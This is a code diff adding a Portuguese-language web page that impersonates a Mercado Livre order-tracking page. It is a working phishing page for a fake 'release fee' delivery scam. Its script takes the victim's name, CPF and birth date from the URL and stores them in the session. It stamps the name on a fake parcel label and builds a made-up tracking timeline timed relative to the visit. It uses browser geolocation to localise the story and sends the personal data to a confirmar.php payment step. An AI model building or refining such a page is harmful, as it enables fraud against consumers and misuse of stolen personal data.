@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Rastreamento de Pedido - Mercado Livre</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f0f0f0;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .container {
+      background-color: #ffffff;
+      max-width: 500px;
+      margin: auto;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      border-top: 4px solid #ffe600;
+      text-align: left;
+    }
+
+    .logo {
+      max-width: 160px;
+      display: block;
+      margin: 0 auto 20px;
+    }
+
+    .welcome-message {
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .alert {
+      background-color: #fff3cd;
+      padding: 12px;
+      border-radius: 5px;
+      color: #856404;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .tracking-image-wrapper {
+      position: relative;
+      margin-top: 20px;
+      text-align: center;
+      line-height: 0;
+    }
+
+    .tracking-image {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 8px;
+    }
+
+    /* Retângulo da etiqueta branca (caixa.png) — posição em % da imagem */
+    .etiqueta-branca-zone {
+      position: absolute;
+      left: 53.4%;
+      top: 23.5%;
+      width: 36.8%;
+      height: 43.8%;
+      pointer-events: none;
+      box-sizing: border-box;
+      overflow: hidden;
+    }
+
+    /* Nome logo abaixo de "DESTINATÁRIO:" — contido na etiqueta branca */
+    .destinatario-nome-overlay {
+      position: absolute;
+      left: 8%;
+      right: 10%;
+      top: 84%;
+      bottom: 2%;
+      text-align: left;
+      box-sizing: border-box;
+      overflow: hidden;
+    }
+
+    .destinatario-nome-overlay .nome-etiqueta {
+      display: block;
+      width: 100%;
+      max-width: 100%;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: 700;
+      font-size: 5.8px;
+      line-height: 1.1;
+      letter-spacing: 0.01em;
+      color: #111;
+      text-transform: uppercase;
+      white-space: normal;
+      overflow-wrap: anywhere;
+      word-break: break-word;
+      hyphens: auto;
+      mix-blend-mode: multiply;
+      filter: contrast(1.25);
+    }
+
+    @media (min-width: 480px) {
+      .etiqueta-branca-zone {
+        left: 53.2%;
+        top: 24%;
+        width: 36.5%;
+        height: 43.2%;
+      }
+      .destinatario-nome-overlay {
+        top: 84%;
+        bottom: 2%;
+        left: 9%;
+        right: 11%;
+      }
+      .destinatario-nome-overlay .nome-etiqueta {
+        font-size: 6.4px;
+        line-height: 1.08;
+      }
+    }
+
+    .pedido-header {
+      display: flex;
+      justify-content: space-between;
+      font-weight: bold;
+      font-size: 14px;
+      color: #333;
+      margin-top: 20px;
+      margin-bottom: 20px;
+    }
+
+    .timeline {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      position: relative;
+    }
+
+    .timeline::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 8px;
+      width: 2px;
+      height: 100%;
+      background-color: #dcdcdc;
+    }
+
+    .timeline li {
+      position: relative;
+      padding-left: 30px;
+      margin-bottom: 15px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .timeline li.highlight {
+      color: #d32f2f;
+      font-weight: bold;
+    }
+
+    .timeline li::before {
+      content: '\2022';
+      color: #ffe600;
+      position: absolute;
+      left: 4px;
+      font-size: 20px;
+    }
+
+    .pay-button {
+      display: block;
+      background-color: #3483fa;
+      color: white;
+      text-align: center;
+      padding: 12px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: bold;
+      margin-top: 25px;
+      transition: background 0.3s ease;
+    }
+
+    .pay-button:hover {
+      background-color: #2968c8;
+    }
+
+    footer {
+      margin-top: 40px;
+      background-color: #f5f5f5;
+      padding: 30px 0;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .footer-container {
+      display: flex;
+      justify-content: center;
+      gap: 50px;
+      flex-wrap: wrap;
+    }
+
+    .footer-section {
+      text-align: left;
+    }
+
+    .footer-section h3 {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .footer-section ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .footer-section ul li {
+      margin-bottom: 8px;
+    }
+
+    .footer-section ul li a {
+      text-decoration: none;
+      color: #555;
+    }
+
+    .footer-section ul li a:hover {
+      color: #3483fa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="gh.png" alt="Mercado Livre" class="logo" />
+
+    <div class="welcome-message">Olá, <span id="username">Usuário</span>!</div>
+
+    <div class="alert">
+      Desculpe, mas raramente as entregas atrasam tanto. Estamos analisando isso e reembolsaremos você se seu pedido for confirmado como perdido.
+    </div>
+
+    <div class="tracking-image-wrapper">
+      <img src="caixa.png" alt="Caixa Mercado Livre — destinatário" class="tracking-image" width="500" height="500">
+      <div class="etiqueta-branca-zone" aria-hidden="true">
+        <div class="destinatario-nome-overlay">
+          <span class="nome-etiqueta" id="overlay-username"></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="pedido-header">
+      <span>Expresso Padrão</span>
+      <span>TL275715965845625</span>
+    </div>
+
+    <ul class="timeline" id="timeline-rastreio">
+      <li class="highlight" id="tl-retido"></li>
+      <li id="tl-falha-entrega"></li>
+      <li id="tl-rota"></li>
+      <li id="entrega"></li>
+      <li id="saida"></li>
+      <li id="tl-preparacao"></li>
+      <li id="tl-pagamento"></li>
+      <li id="tl-pedido"></li>
+    </ul>
+
+    <a href="#" id="payBtn" class="pay-button">Pagar Taxa de Liberação</a>
+  </div>
+
+  <footer>
+    <div class="footer-container">
+      <div class="footer-section">
+        <h3>ATENDIMENTO AO CLIENTE</h3>
+        <ul>
+          <li><a href="#">Central de Ajuda</a></li>
+          <li><a href="#">Como Comprar</a></li>
+          <li><a href="#">Pagamentos</a></li>
+          <li><a href="#">Garantia</a></li>
+          <li><a href="#">Devoluções</a></li>
+          <li><a href="#">Fale Conosco</a></li>
+        </ul>
+      </div>
+      <div class="footer-section">
+        <h3>SOBRE O MERCADO LIVRE</h3>
+        <ul>
+          <li><a href="#">Quem Somos</a></li>
+          <li><a href="#">Políticas</a></li>
+          <li><a href="#">Privacidade</a></li>
+          <li><a href="#">Afiliados</a></li>
+          <li><a href="#">Entregadores</a></li>
+          <li><a href="#">Imprensa</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+<script>
+  // Pega o nome do usuário via URL
+  function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+
+  function decodificarNome(raw) {
+    if (!raw) return "";
+    try {
+      return decodeURIComponent(String(raw).replace(/\+/g, " ")).trim();
+    } catch (_) {
+      return String(raw).trim();
+    }
+  }
+
+  function obterNomeDaPuxada() {
+    const daUrl = decodificarNome(getQueryParam("nome"));
+    if (daUrl) {
+      sessionStorage.setItem("ml_nome", daUrl);
+      sessionStorage.setItem("ml_cpf", getQueryParam("cpf") || "");
+      sessionStorage.setItem("ml_nascimento", getQueryParam("nascimento") || "");
+      return daUrl;
+    }
+    return decodificarNome(sessionStorage.getItem("ml_nome") || "");
+  }
+
+  function nomeCabeNoOverlay(el, parent) {
+    if (!el || !parent) return true;
+    const pr = parent.getBoundingClientRect();
+    const er = el.getBoundingClientRect();
+    return er.width <= pr.width + 0.5 && er.height <= pr.height + 0.5;
+  }
+
+  function partesNome(nome) {
+    return String(nome || "")
+      .trim()
+      .replace(/\s+/g, " ")
+      .split(" ")
+      .filter(Boolean)
+      .map((p) => p.toUpperCase());
+  }
+
+  /** Na foto do pacote: somente 1º e 2º nome da puxada. */
+  function nomeParaFotoPacote(nome) {
+    const partes = partesNome(nome);
+    if (partes.length >= 2) {
+      return partes[0] + " " + partes[1];
+    }
+    if (partes.length === 1) {
+      return partes[0];
+    }
+    return String(nome || "").trim() || "Destinatário";
+  }
+
+  function capPxNomeEtiqueta() {
+    return window.matchMedia("(min-width: 480px)").matches ? 6.4 : 5.8;
+  }
+
+  function ajustarFonteParaCaber(el, parent, texto, capPx, minPx) {
+    el.textContent = texto;
+    let size = capPx;
+    if (parent.clientWidth > 0) {
+      size = Math.min(capPx, parent.clientWidth / Math.max(texto.length * 0.48, 11));
+    }
+    el.style.fontSize = size + "px";
+
+    let guard = 0;
+    while (guard < 28 && size > minPx && !nomeCabeNoOverlay(el, parent)) {
+      size -= 0.25;
+      el.style.fontSize = size + "px";
+      guard++;
+    }
+    return {
+      cabe: nomeCabeNoOverlay(el, parent),
+      fontSize: size,
+    };
+  }
+
+  function ajustarNomeNaEtiqueta(nomeCompleto) {
+    const el = document.getElementById("overlay-username");
+    if (!el) return nomeCompleto;
+    const parent = el.parentElement;
+    el.style.transform = "";
+    if (!parent) return nomeCompleto;
+
+    const capPx = capPxNomeEtiqueta();
+    const minPx = 3.8;
+    const textoEtiqueta = nomeParaFotoPacote(nomeCompleto);
+
+    el.textContent = textoEtiqueta;
+    el.style.fontSize = capPx + "px";
+    if (nomeCabeNoOverlay(el, parent)) {
+      return textoEtiqueta;
+    }
+
+    ajustarFonteParaCaber(el, parent, textoEtiqueta, capPx, minPx);
+    if (nomeCabeNoOverlay(el, parent)) {
+      return textoEtiqueta;
+    }
+
+    const partes = partesNome(nomeCompleto);
+    if (partes.length >= 2) {
+      const soPrimeiro = partes[0];
+      ajustarFonteParaCaber(el, parent, soPrimeiro, capPx, minPx);
+      return soPrimeiro;
+    }
+
+    return textoEtiqueta;
+  }
+
+  function updateUsername() {
+    const finalName = obterNomeDaPuxada() || "Destinatário";
+    document.getElementById("username").innerText = finalName;
+    ajustarNomeNaEtiqueta(finalName);
+  }
+
+  const MESES_PT = ["jan", "fev", "mar", "abr", "mai", "jun", "jul", "ago", "set", "out", "nov", "dez"];
+  let timelineLocal = "Curitiba/Paraná";
+  let timelineTimer = null;
+
+  function formatarDataTimeline(data) {
+    const dia = data.getDate();
+    const mes = MESES_PT[data.getMonth()];
+    const h = String(data.getHours()).padStart(2, "0");
+    const min = String(data.getMinutes()).padStart(2, "0");
+    return `${dia} ${mes} ${h}:${min}`;
+  }
+
+  function dataMinutosAtras(minutos) {
+    return new Date(Date.now() - minutos * 60 * 1000);
+  }
+
+  function montarTimeline() {
+    const eventos = [
+      {
+        id: "tl-retido",
+        quando: dataMinutosAtras(38),
+        texto: "Pedido retido: necessário regularizar pendência de pagamento para liberação.",
+      },
+      {
+        id: "tl-falha-entrega",
+        quando: dataMinutosAtras(31 * 60 + 20),
+        texto: "Encomenda saiu para entrega, mas não foi possível concluir",
+      },
+      {
+        id: "tl-rota",
+        quando: dataMinutosAtras(40 * 60 + 15),
+        texto: "Encomenda em rota de entrega com o entregador",
+      },
+      {
+        id: "entrega",
+        quando: dataMinutosAtras(2 * 24 * 60 + 90),
+        texto: `Pedido chegou à agência de distribuição - ${timelineLocal}`,
+      },
+      {
+        id: "saida",
+        quando: dataMinutosAtras(2 * 24 * 60 + 480),
+        texto: `Pedido saiu do centro de distribuição - ${timelineLocal}`,
+      },
+      {
+        id: "tl-preparacao",
+        quando: dataMinutosAtras(3 * 24 * 60 + 300),
+        texto: "Pedido em preparação para envio",
+      },
+      {
+        id: "tl-pagamento",
+        quando: dataMinutosAtras(3 * 24 * 60 + 420),
+        texto: "Pagamento confirmado, preparando pedido para envio",
+      },
+      {
+        id: "tl-pedido",
+        quando: dataMinutosAtras(4 * 24 * 60 + 180),
+        texto: "Pedido realizado com sucesso",
+      },
+    ];
+
+    eventos.forEach((ev) => {
+      const el = document.getElementById(ev.id);
+      if (!el) return;
+      el.textContent = `${formatarDataTimeline(ev.quando)} - ${ev.texto}`;
+    });
+  }
+
+  function iniciarTimelineTempoReal() {
+    montarTimeline();
+    if (timelineTimer) clearInterval(timelineTimer);
+    timelineTimer = setInterval(montarTimeline, 60 * 1000);
+  }
+
+  function atualizarLocalNaTimeline(cidade, estado) {
+    timelineLocal = `${cidade}/${estado}`;
+    montarTimeline();
+  }
+
+  // Obtém localização do usuário
+  function getUserLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Consulta reversa no OpenStreetMap
+          fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+            .then(response => response.json())
+            .then(data => {
+              const cidade = data.address.city || data.address.town || data.address.village || "Curitiba";
+              const estado = data.address.state || "Paraná";
+              atualizarLocalNaTimeline(cidade, estado);
+            })
+            .catch(error => {
+              console.warn("Erro ao converter coordenadas. Usando padrão Curitiba/PR.");
+              atualizarLocalNaTimeline("Curitiba", "Paraná");
+            });
+        },
+        error => {
+          console.warn("Permissão negada ou erro de geolocalização. Usando padrão Curitiba/PR.");
+          atualizarLocalNaTimeline("Curitiba", "Paraná");
+        }
+      );
+    } else {
+      console.warn("Geolocalização não suportada. Usando padrão Curitiba/PR.");
+      atualizarLocalNaTimeline("Curitiba", "Paraná");
+    }
+  }
+
+  function irParaPagamento() {
+    const nome = obterNomeDaPuxada() || getQueryParam("nome") || "";
+    const cpf = getQueryParam("cpf") || sessionStorage.getItem("ml_cpf") || "";
+    const nascimento = getQueryParam("nascimento") || sessionStorage.getItem("ml_nascimento") || "";
+    const qs = new URLSearchParams();
+    if (nome) qs.set("nome", nome);
+    if (cpf) qs.set("cpf", cpf);
+    if (nascimento) qs.set("nascimento", nascimento);
+    window.location.href = "confirmar.php?" + qs.toString();
+  }
+
+  function recalcularNomeEtiqueta() {
+    const nome = obterNomeDaPuxada() || "Destinatário";
+    ajustarNomeNaEtiqueta(nome);
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+    updateUsername();
+    iniciarTimelineTempoReal();
+    const img = document.querySelector(".tracking-image");
+    if (img) {
+      if (img.complete) recalcularNomeEtiqueta();
+      else img.addEventListener("load", recalcularNomeEtiqueta, { once: true });
+    }
+    window.addEventListener("resize", recalcularNomeEtiqueta);
+    getUserLocation();
+    const payBtn = document.getElementById("payBtn");
+    if (payBtn) {
+      payBtn.addEventListener("click", function (e) {
+        e.preventDefault();
+        irParaPagamento();
+      });
+    }
+  });
+</script>
+
+</body>
+</html>
